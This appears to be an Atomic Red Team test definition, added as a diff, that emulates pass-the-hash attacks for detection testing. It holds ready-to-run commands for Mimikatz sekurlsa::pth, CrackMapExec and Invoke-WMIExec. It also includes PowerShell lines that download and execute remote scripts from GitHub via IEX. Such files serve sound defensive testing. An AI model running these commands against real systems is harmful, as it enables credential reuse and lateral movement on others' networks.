@@ -1,0 +1,115 @@
+attack_technique: T1550.002
+display_name: 'Use Alternate Authentication Material: Pass the Hash'
+atomic_tests:
+- name: Mimikatz Pass the Hash
+  auto_generated_guid: ec23cef9-27d9-46e4-a68d-6f75f7b86908
+  description: |
+    Note: must dump hashes first
+    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+  supported_platforms:
+  - windows
+  input_arguments:
+    user_name:
+      description: username
+      type: string
+      default: Administrator
+    ntlm:
+      description: ntlm hash
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+    domain:
+      description: domain
+      type: string
+      default: '%userdnsdomain%'
+    mimikatz_path:
+      description: mimikatz windows executable
+      type: path
+      default: '%tmp%\mimikatz\x64\mimikatz.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
+    prereq_command: |
+      $mimikatz_path = cmd /c echo #{mimikatz_path}
+      if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
+      $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
+      $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
+      $mimikatz_exe = cmd /c echo #{mimikatz_path}
+      $basePath = Split-Path $mimikatz_exe | Split-Path
+      Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
+  executor:
+    command: |
+      #{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
+    name: command_prompt
+- name: crackmapexec Pass the Hash
+  auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
+  description: |
+    command execute with crackmapexec
+  supported_platforms:
+  - windows
+  input_arguments:
+    user_name:
+      description: username
+      type: string
+      default: Administrator
+    crackmapexec_exe:
+      description: crackmapexec windows executable
+      type: path
+      default: C:\CrackMapExecWin\crackmapexec.exe
+    command:
+      description: command to execute
+      type: string
+      default: whoami
+    ntlm:
+      description: command
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+    domain:
+      description: domain
+      type: string
+      default: '%userdnsdomain%'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})
+    prereq_command: |
+      if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}
+  executor:
+    command: |
+      #{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
+    name: command_prompt
+- name: Invoke-WMIExec Pass the Hash
+  auto_generated_guid: f8757545-b00a-4e4e-8cfb-8cfb961ee713
+  description: |-
+    Use Invoke-WMIExec to Pass the Hash
+    Note: must dump hashes first
+    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+  supported_platforms:
+  - windows
+  input_arguments:
+    ntlm:
+      description: ntlm hash
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+    user_name:
+      description: username
+      type: string
+      default: Administrator
+    command:
+      description: Command to run on target system
+      type: string
+      default: hostname
+    target:
+      description: System to run command on
+      type: string
+      default: '$env:COMPUTERNAME'
+  executor:
+    command: |-
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
+    name: powershell
